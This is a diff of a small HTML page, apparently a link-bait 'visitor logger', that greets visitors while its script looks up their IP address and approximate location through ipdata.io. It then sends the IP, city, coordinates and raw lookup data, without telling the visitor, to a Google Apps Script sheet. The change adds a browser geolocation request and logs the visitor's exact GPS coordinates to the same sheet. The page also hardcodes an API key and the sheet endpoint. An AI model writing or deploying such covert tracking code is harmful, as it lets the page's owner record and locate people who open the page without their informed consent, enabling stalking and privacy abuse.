@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="utf-8" />
-  <title>Visitor Logger with ipdata.io</title>
+  <title>Visitor Logger with ipdata.io & Geolocation</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -12,51 +12,88 @@
     }
     h1 { color: #333; }
     p { color: #555; }
+    a { color: #0077cc; text-decoration: none; }
+    a:hover { text-decoration: underline; }
   </style>
 </head>
 <body>
   <h1>Hello 👋</h1>
   <div id="location">Checking your location...</div>
+  <div id="exact-location"></div>
 
   <script>
-    const IPDATA_KEY = "66ff8183ca16012885e156efee7fa9544853ee96576dc8a38ba406d1"; 
+    const IPDATA_KEY = "66ff8183ca16012885e156efee7fa9544853ee96576dc8a38ba406d1";
     const SHEET_WEBAPP_URL = "https://script.google.com/macros/s/AKfycby7HB928piVdSZL4ovPU4jj4JvOfHCY8kgPPUOXJ9-kRTX3ZL5CMXY0fNiv0MMAJZoGyA/exec";
 
     async function reportVisitor() {
       try {
-        // Get visitor info from ipdata.io
+        // 1️⃣ Get approximate IP-based location
         const resp = await fetch(`https://api.ipdata.co?api-key=${IPDATA_KEY}`);
         const data = await resp.json();
 
-        // Handle possible ipdata.io errors
         if (data.message) {
           document.getElementById("location").textContent = `Error from ipdata.io: ${data.message}`;
           console.warn("ipdata.io error:", data.message);
           return;
         }
 
-        // Show visitor info on the page
+        // Show approximate location
         document.getElementById("location").innerHTML = `
           <p>You are visiting from <strong>${data.city || 'Unknown'}, ${data.country_name || 'Unknown'}</strong></p>
-          <p>Latitude: ${data.latitude || 'N/A'}, Longitude: ${data.longitude || 'N/A'}</p>
+          <p>Approx. coordinates: ${data.latitude || 'N/A'}, ${data.longitude || 'N/A'}</p>
         `;
 
-        // Send details to Google Sheet
-        const params = new URLSearchParams({
+        // Log IP-based info to Google Sheet
+        const paramsIP = new URLSearchParams({
           ip: data.ip || '',
           city: data.city || '',
           region: data.region || '',
           country: data.country_name || '',
           latitude: data.latitude || '',
           longitude: data.longitude || '',
+          type: "IP-based",
           raw: JSON.stringify(data)
         });
+        fetch(`${SHEET_WEBAPP_URL}?${paramsIP.toString()}`, { method: 'GET' });
 
-        // Send silently (no need to await)
-        fetch(`${SHEET_WEBAPP_URL}?${params.toString()}`, { method: 'GET' });
+        // 2️⃣ Try browser geolocation for exact coordinates
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(
+            position => {
+              const lat = position.coords.latitude;
+              const lon = position.coords.longitude;
+
+              const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+              document.getElementById("exact-location").innerHTML = `
+                <p>Exact coordinates: ${lat.toFixed(6)}, ${lon.toFixed(6)}</p>
+                <p><a href="${mapsLink}" target="_blank">View on Google Maps</a></p>
+              `;
+
+              // Log exact coordinates to Google Sheet
+              const paramsGeo = new URLSearchParams({
+                ip: data.ip || '',
+                city: data.city || '',
+                region: data.region || '',
+                country: data.country_name || '',
+                latitude: lat,
+                longitude: lon,
+                type: "Browser GPS",
+                raw: ''
+              });
+              fetch(`${SHEET_WEBAPP_URL}?${paramsGeo.toString()}`, { method: 'GET' });
+
+            },
+            error => {
+              console.warn("Geolocation error:", error.message);
+              document.getElementById("exact-location").textContent = "Exact location unavailable (permission denied or unsupported).";
+            }
+          );
+        } else {
+          document.getElementById("exact-location").textContent = "Geolocation not supported by your browser.";
+        }
 
       } catch (err) {
-        console.error("Fetch error:", err);
+        console.error("Error fetching IP data:", err);
         document.getElementById("location").textContent = "Could not fetch location.";
       }
     }
